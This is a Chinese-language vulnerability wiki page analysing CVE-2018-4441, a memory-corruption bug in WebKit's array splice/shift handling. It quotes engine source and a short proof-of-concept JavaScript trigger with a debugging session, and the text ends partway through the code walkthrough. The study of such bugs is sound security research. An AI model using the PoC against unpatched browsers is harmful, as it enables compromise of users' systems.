<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Webkit/%EF%BC%88CVE-2018-4441%EF%BC%89Webkit%20shiftCountWithArrayStorage/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2018-4441）Webkit shiftCountWithArrayStorage - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2018-4441\uff09Webkit shiftCountWithArrayStorage", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Weblogic/WebLogic%20Local%20File%20Inclusion%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2022-21371/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Weblogic/WebLogic%20Local%20File%20Inclusion%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2022-21371/" class="btn btn-xs btn-link">
        WebLogic Local File Inclusion 本地文件包含漏洞 CVE-2022-21371
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Webgrind/Webgrind%20fileviewer.phtml%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2018-12909/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Webgrind/Webgrind%20fileviewer.phtml%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2018-12909/" class="btn btn-xs btn-link">
        Webgrind fileviewer.phtml 任意文件读取漏洞 CVE-2018-12909
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2018-4441webkit-shiftcountwitharraystorage">（CVE-2018-4441）Webkit shiftCountWithArrayStorage<a class="headerlink" href="#cve-2018-4441webkit-shiftcountwitharraystorage" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>WebKit是Apple
Safari浏览器中的Web浏览器引擎，也是其他macOS、iOS和Linux系统中应用的浏览器引擎。2018年12月，该漏洞在公开披露后，被发现影响最新版本的苹果Safari浏览器。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<h4 id="_5">环境配置<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
<p>这里我用了补丁的前一个版本 commit
<code>21687be235d506b9712e83c1e6d8e0231cc9adfd</code> , 在 ubuntu 1804
下编译，环境相关的文件都放在了<a href="https://github.com/rtfingc/cve-repo/tree/master/0x05-lokihardt-webkit-cve-2018-4441-shiftCountWithArrayStorage">这里</a></p>
<h4 id="_6">漏洞描述<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
<p>漏洞发生在<code>JSArray::shiftCountWithArrayStorage</code> 这个函数，根据lokihardt
的描述，除非对象的prototype 有indexed accessors 或者
proxy对象(我也不清楚是什么:( ),
否则调用到这个函数的时候<code>holesMustForwardToPrototype</code> 都会返回<code>false</code>,
本来带holes 的对象就可以进入下面的处理逻辑(总的来说就是代码写错了)</p>
<div class="codehilite"><pre><span></span><code><span class="nb nb-Type">bool</span><span class="w"> </span><span class="n">JSArray</span><span class="p">::</span><span class="n">shiftCountWithArrayStorage</span><span class="p">(</span><span class="n">VM</span><span class="o">&amp;</span><span class="w"> </span><span class="n">vm</span><span class="p">,</span><span class="w"> </span><span class="n">unsigned</span><span class="w"> </span><span class="n">startIndex</span><span class="p">,</span><span class="w"> </span><span class="n">unsigned</span><span class="w"> </span><span class="n">count</span><span class="p">,</span><span class="w"> </span><span class="n">ArrayStorage</span><span class="o">*</span><span class="w"> </span><span class="n">storage</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">unsigned</span><span class="w"> </span><span class="n">oldLength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">storage</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">();</span>
<span class="w">    </span><span class="n">RELEASE_ASSERT</span><span class="p">(</span><span class="n">count</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">oldLength</span><span class="p">);</span>

<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">If</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">array</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="n">holes</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">otherwise</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">abnormal</span><span class="w"> </span><span class="n">state</span><span class="p">,</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">generic</span><span class="w"> </span><span class="n">algorithm</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">ArrayPrototype</span><span class="o">.</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">storage</span><span class="o">-&gt;</span><span class="n">hasHoles</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="n">structure</span><span class="p">(</span><span class="n">vm</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">holesMustForwardToPrototype</span><span class="p">(</span><span class="n">vm</span><span class="p">,</span><span class="w"> </span><span class="n">this</span><span class="p">))</span><span class="w"> </span>
<span class="w">        </span><span class="o">||</span><span class="w"> </span><span class="n">hasSparseMap</span><span class="p">()</span><span class="w"> </span>
<span class="w">        </span><span class="o">||</span><span class="w"> </span><span class="n">shouldUseSlowPut</span><span class="p">(</span><span class="n">indexingType</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">oldLength</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="bp">true</span><span class="p">;</span>

<span class="w">    </span><span class="n">unsigned</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">oldLength</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">count</span><span class="p">;</span>

<span class="w">    </span><span class="n">storage</span><span class="o">-&gt;</span><span class="n">m_numValuesInVector</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">count</span><span class="p">;</span>
<span class="w">    </span><span class="n">storage</span><span class="o">-&gt;</span><span class="n">setLength</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
<span class="o">//.....</span>
<span class="nb nb-Type">bool</span><span class="w"> </span><span class="n">Structure</span><span class="p">::</span><span class="n">holesMustForwardToPrototype</span><span class="p">(</span><span class="n">VM</span><span class="o">&amp;</span><span class="w"> </span><span class="n">vm</span><span class="p">,</span><span class="w"> </span><span class="n">JSObject</span><span class="o">*</span><span class="w"> </span><span class="n">base</span><span class="p">)</span><span class="w"> </span><span class="k">const</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">ASSERT</span><span class="p">(</span><span class="n">base</span><span class="o">-&gt;</span><span class="n">structure</span><span class="p">(</span><span class="n">vm</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">this</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">mayInterceptIndexedAccesses</span><span class="p">())</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="bp">true</span><span class="p">;</span>

<span class="w">    </span><span class="n">JSValue</span><span class="w"> </span><span class="n">prototype</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="n">storedPrototype</span><span class="p">(</span><span class="n">base</span><span class="p">);</span><span class="o">//</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">prototype</span><span class="o">.</span><span class="n">isObject</span><span class="p">())</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span>
<span class="w">    </span><span class="n">JSObject</span><span class="o">*</span><span class="w"> </span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">asObject</span><span class="p">(</span><span class="n">prototype</span><span class="p">);</span>

<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="bp">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">Structure</span><span class="o">&amp;</span><span class="w"> </span><span class="n">structure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">structure</span><span class="p">(</span><span class="n">vm</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hasIndexedProperties</span><span class="p">(</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">indexingType</span><span class="p">())</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">structure</span><span class="o">.</span><span class="n">mayInterceptIndexedAccesses</span><span class="p">())</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="bp">true</span><span class="p">;</span>
<span class="w">        </span><span class="n">prototype</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">structure</span><span class="o">.</span><span class="n">storedPrototype</span><span class="p">(</span><span class="n">object</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">prototype</span><span class="o">.</span><span class="n">isObject</span><span class="p">())</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span>
<span class="w">        </span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">asObject</span><span class="p">(</span><span class="n">prototype</span><span class="p">);</span>
</code></pre></div>

<h4 id="poc">poc 分析<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>function main() {
    let arr = [1];

    arr.length = 0x100000;
    arr.splice(0, 0x11);

    arr.length = 0xfffffff0;
    arr.splice(0xfffffff0, 0, 1);
}

main();
</code></pre></div>

<p><code>lokihardt</code> 给出了poc</p>
<div class="codehilite"><pre><span></span><code>./jsc
&gt;&gt;&gt; a=[1]
1
&gt;&gt;&gt; describe(a)
Object: 0x7fffaf6b4340 with butterfly 0x7fe0000e4008 (Structure 0x7fffaf6f2a00:[Array, {}, ArrayWithInt32, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 97
&gt;&gt;&gt; a.length=0x100000
1048576
&gt;&gt;&gt; describe(a)
Object: 0x7fffaf6b4340 with butterfly 0x7fe0000f8448 (Structure 0x7fffaf6f2b50:[Array, {}, ArrayWithArrayStorage, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 100
&gt;&gt;&gt; a.splice(0,0x11)
1,,,,,,,,,,,,,,,,
</code></pre></div>

<p>首先创建了一个 <code>ArrayWithInt32</code> 类型的array, length 改成<code>0x100000</code>
之后会转换成<code>ArrayWithArrayStorage</code>, 然后调用 <code>splice</code>
函数，实现在<code>Source/JavaScriptCore/runtime/ArrayPrototype.cpp:1005</code>
的<code>arrayProtoFuncSplice</code> 函数</p>
<p>splice 用来删除修改array, 如 <code>a.splice(0, 0x11)</code>, 就表示从<code>index=0</code>
开始删除0x11 项， 第三个参数表示要替换的内容， 如<code>a.splice(0,0x11,1,1)</code>
表示删除 0x11 个项，然后添加两个项，内容都是1,
也可以这<code>a.splice(0,1,1,2,3)</code>
要添加的项比删除多的时候会重新分配内存。我们看一下函数具体是怎么样实现的，
这里用poc 的 <code>a.length=0x100000; a.splice(0,0x11)</code> 为例</p>
<div class="codehilite"><pre><span></span><code><span class="nt">EncodedJSValue</span><span class="w"> </span><span class="nt">JSC_HOST_CALL</span><span class="w"> </span><span class="nt">arrayProtoFuncSplice</span><span class="o">(</span><span class="nt">ExecState</span><span class="o">*</span><span class="w"> </span><span class="nt">exec</span><span class="o">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="err">//</span><span class="w"> </span><span class="err">15.4.4.12</span>

<span class="w">    </span><span class="err">VM&amp;</span><span class="w"> </span><span class="err">vm</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">exec-&gt;vm()</span><span class="p">;</span>
<span class="w">    </span><span class="err">auto</span><span class="w"> </span><span class="err">scope</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">DECLARE_THROW_SCOPE(vm)</span><span class="p">;</span>

<span class="w">    </span><span class="err">JSObject*</span><span class="w"> </span><span class="err">thisObj</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">exec-&gt;thisValue().toThis(exec,</span><span class="w"> </span><span class="err">StrictMode).toObject(exec)</span><span class="p">;</span>
<span class="w">    </span><span class="err">EXCEPTION_ASSERT(!!scope.exception()</span><span class="w"> </span><span class="err">==</span><span class="w"> </span><span class="err">!thisObj)</span><span class="p">;</span>
<span class="w">    </span><span class="err">if</span><span class="w"> </span><span class="err">(UNLIKELY(!thisObj))</span>
<span class="w">        </span><span class="err">return</span><span class="w"> </span><span class="err">encodedJSValue()</span><span class="p">;</span>
<span class="w">    </span><span class="err">//</span><span class="w"> </span><span class="err">length</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">0x100000</span>
<span class="w">    </span><span class="err">unsigned</span><span class="w"> </span><span class="err">length</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">toLength(exec,</span><span class="w"> </span><span class="err">thisObj)</span><span class="p">;</span>
<span class="w">    </span><span class="err">RETURN_IF_EXCEPTION(scope,</span><span class="w"> </span><span class="err">encodedJSValue())</span><span class="p">;</span>

<span class="w">    </span><span class="err">if</span><span class="w"> </span><span class="err">(!exec-&gt;argumentCount())</span><span class="w"> </span><span class="err">{</span>
<span class="err">//..</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="nt">splice</span><span class="w"> </span><span class="nt">第一个参数</span><span class="err">，</span><span class="w"> </span><span class="nt">这里是</span><span class="w"> </span><span class="nt">0</span>
<span class="w">    </span><span class="nt">unsigned</span><span class="w"> </span><span class="nt">actualStart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">argumentClampedIndexFromStartOrEnd</span><span class="o">(</span><span class="nt">exec</span><span class="o">,</span><span class="w"> </span><span class="nt">0</span><span class="o">,</span><span class="w"> </span><span class="nt">length</span><span class="o">);</span>
<span class="w">    </span><span class="nt">RETURN_IF_EXCEPTION</span><span class="o">(</span><span class="nt">scope</span><span class="o">,</span><span class="w"> </span><span class="nt">encodedJSValue</span><span class="o">());</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="nt">actualDeleteCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">0x100000</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">0</span>
<span class="w">    </span><span class="nt">unsigned</span><span class="w"> </span><span class="nt">actualDeleteCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">length</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">actualStart</span><span class="o">;</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="nt">argumentCount</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nt">2</span><span class="o">,</span><span class="w"> </span><span class="nt">进入判断</span><span class="err">，</span><span class="w"> </span><span class="nt">actualDeleteCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">0x11</span>
<span class="w">    </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">exec-</span><span class="o">&gt;</span><span class="nt">argumentCount</span><span class="o">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nt">1</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">double</span><span class="w"> </span><span class="err">deleteCount</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">exec-&gt;uncheckedArgument(1).toInteger(exec)</span><span class="p">;</span>
<span class="w">        </span><span class="err">RETURN_IF_EXCEPTION(scope,</span><span class="w"> </span><span class="err">encodedJSValue())</span><span class="p">;</span>
<span class="w">        </span><span class="err">if</span><span class="w"> </span><span class="err">(deleteCount</span><span class="w"> </span><span class="err">&lt;</span><span class="w"> </span><span class="err">0)</span>
<span class="w">            </span><span class="err">actualDeleteCount</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">0</span><span class="p">;</span>
<span class="w">        </span><span class="err">else</span><span class="w"> </span><span class="err">if</span><span class="w"> </span><span class="err">(deleteCount</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="err">length</span><span class="w"> </span><span class="err">-</span><span class="w"> </span><span class="err">actualStart)</span>
<span class="w">            </span><span class="err">actualDeleteCount</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">length</span><span class="w"> </span><span class="err">-</span><span class="w"> </span><span class="err">actualStart</span><span class="p">;</span>
<span class="w">        </span><span class="err">else</span>
<span class="w">            </span><span class="err">actualDeleteCount</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">static_cast&lt;unsigned&gt;(deleteCount)</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="o">//...</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="nt">itemCount</span><span class="w"> </span><span class="nt">表示要添加的</span><span class="w"> </span><span class="nt">item</span><span class="w"> </span><span class="nt">数量</span><span class="err">，</span><span class="w"> </span><span class="nt">这里是</span><span class="w"> </span><span class="nt">0</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nt">0x11</span><span class="w"> </span><span class="nt">--</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">调用</span><span class="w"> </span><span class="nt">shift</span>
<span class="w">    </span><span class="nt">unsigned</span><span class="w"> </span><span class="nt">itemCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">std</span><span class="p">::</span><span class="nd">max</span><span class="o">&lt;</span><span class="nt">int</span><span class="o">&gt;(</span><span class="nt">exec-</span><span class="o">&gt;</span><span class="nt">argumentCount</span><span class="o">()</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">2</span><span class="o">,</span><span class="w"> </span><span class="nt">0</span><span class="o">);</span>
<span class="w">    </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">itemCount</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nt">actualDeleteCount</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">shift&lt;</span><span class="n">JSArray</span><span class="p">:</span><span class="o">:</span><span class="n">ShiftCountForSplice</span><span class="o">&gt;</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="n">thisObj</span><span class="p">,</span><span class="w"> </span><span class="n">actualStart</span><span class="p">,</span><span class="w"> </span><span class="n">actualDeleteCount</span><span class="p">,</span><span class="w"> </span><span class="n">itemCount</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>
<span class="w">        </span><span class="err">RETURN_IF_EXCEPTION(scope,</span><span class="w"> </span><span class="err">encodedJSValue())</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">itemCount</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nt">actualDeleteCount</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">unshift&lt;</span><span class="n">JSArray</span><span class="p">:</span><span class="o">:</span><span class="n">ShiftCountForSplice</span><span class="o">&gt;</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="n">thisObj</span><span class="p">,</span><span class="w"> </span><span class="n">actualStart</span><span class="p">,</span><span class="w"> </span><span class="n">actualDeleteCount</span><span class="p">,</span><span class="w"> </span><span class="n">itemCount</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>
<span class="w">        </span><span class="err">RETURN_IF_EXCEPTION(scope,</span><span class="w"> </span><span class="err">encodedJSValue())</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="nt">把每个添加的item</span><span class="w"> </span><span class="nt">内容写入</span>
<span class="w">    </span><span class="nt">for</span><span class="w"> </span><span class="o">(</span><span class="nt">unsigned</span><span class="w"> </span><span class="nt">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">0</span><span class="o">;</span><span class="w"> </span><span class="nt">k</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nt">itemCount</span><span class="o">;</span><span class="w"> </span><span class="o">++</span><span class="nt">k</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">thisObj-&gt;putByIndexInline(exec,</span><span class="w"> </span><span class="err">k</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">actualStart,</span><span class="w"> </span><span class="err">exec-&gt;uncheckedArgument(k</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">2),</span><span class="w"> </span><span class="err">true)</span><span class="p">;</span>
<span class="w">        </span><span class="err">RETURN_IF_EXCEPTION(scope,</span><span class="w"> </span><span class="err">encodedJSValue())</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="nt">重新设置长度</span><span class="w">   </span>
<span class="w">    </span><span class="nt">scope</span><span class="p">.</span><span class="nc">release</span><span class="o">();</span>
<span class="w">    </span><span class="nt">setLength</span><span class="o">(</span><span class="nt">exec</span><span class="o">,</span><span class="w"> </span><span class="nt">vm</span><span class="o">,</span><span class="w"> </span><span class="nt">thisObj</span><span class="o">,</span><span class="w"> </span><span class="nt">length</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">actualDeleteCount</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">itemCount</span><span class="o">);</span>
<span class="w">    </span><span class="nt">return</span><span class="w"> </span><span class="nt">JSValue</span><span class="p">::</span><span class="nd">encode</span><span class="o">(</span><span class="nt">result</span><span class="o">);</span>
<span class="err">}</span>
</code></pre></div>

<p>整理一下</p>
<ul>
<li>
<p><code>actualStart</code> 第一个参数，表示要开始delete 的地方</p>
</li>
<li>
<p><code>actualDeleteCount</code> 第二个参数，要delete
    的数量，没有设置时默认是<code>length - actualStart</code></p>
</li>
<li>
<p>itemCount</p>
</li>
</ul>
<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
</code></pre></div>
-   第三个参数开始的数量</p>
<div class="codehilite"><pre><span></span><code>-   `itemCount &lt; actualDeleteCount` 会调用 shift
-   `itemCount &gt; actualDeleteCount` 调用 unshift
</code></pre></div>

<p>我们跟一下<code>shift</code></p>
<div class="codehilite"><pre><span></span><code><span class="n">template</span><span class="o">&lt;</span><span class="n">JSArray</span><span class="o">::</span><span class="n">ShiftCountMode</span><span class="w"> </span><span class="n">shiftCountMode</span><span class="o">&gt;</span>
<span class="n">void</span><span class="w"> </span><span class="n">shift</span><span class="p">(</span><span class="n">ExecState</span><span class="o">*</span><span class="w"> </span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="n">JSObject</span><span class="o">*</span><span class="w"> </span><span class="n">thisObj</span><span class="p">,</span><span class="w"> </span><span class="k">unsigned</span><span class="w"> </span><span class="n">header</span><span class="p">,</span><span class="w"> </span><span class="k">unsigned</span><span class="w"> </span><span class="n">currentCount</span><span class="p">,</span><span class="w"> </span><span class="k">unsigned</span><span class="w"> </span><span class="n">resultCount</span><span class="p">,</span><span class="w"> </span><span class="k">unsigned</span><span class="w"> </span><span class="n">length</span><span class="p">)</span>
<span class="err">{</span>
<span class="w">    </span><span class="n">VM</span><span class="o">&amp;</span><span class="w"> </span><span class="n">vm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">exec</span><span class="o">-&gt;</span><span class="n">vm</span><span class="p">();</span>
<span class="w">    </span><span class="n">auto</span><span class="w"> </span><span class="n">scope</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DECLARE_THROW_SCOPE</span><span class="p">(</span><span class="n">vm</span><span class="p">);</span>

<span class="w">    </span><span class="n">RELEASE_ASSERT</span><span class="p">(</span><span class="n">currentCount</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">resultCount</span><span class="p">);</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">要多</span><span class="w"> </span><span class="k">delete</span><span class="w"> </span><span class="n">的数量</span>
<span class="w">    </span><span class="k">unsigned</span><span class="w"> </span><span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">currentCount</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">resultCount</span><span class="p">;</span>

<span class="w">    </span><span class="n">RELEASE_ASSERT</span><span class="p">(</span><span class="n">header</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>
<span class="w">    </span><span class="n">RELEASE_ASSERT</span><span class="p">(</span><span class="n">currentCount</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">header</span><span class="p">));</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isJSArray</span><span class="p">(</span><span class="n">thisObj</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="n">JSArray</span><span class="o">*</span><span class="w"> </span><span class="k">array</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">asArray</span><span class="p">(</span><span class="n">thisObj</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">array</span><span class="o">-&gt;</span><span class="nf">length</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">array</span><span class="o">-&gt;</span><span class="n">shiftCount</span><span class="o">&lt;</span><span class="n">shiftCountMode</span><span class="o">&gt;</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="n">header</span><span class="p">,</span><span class="w"> </span><span class="n">count</span><span class="p">))</span>
<span class="w">            </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="k">unsigned</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">header</span><span class="p">;</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">currentCount</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">k</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
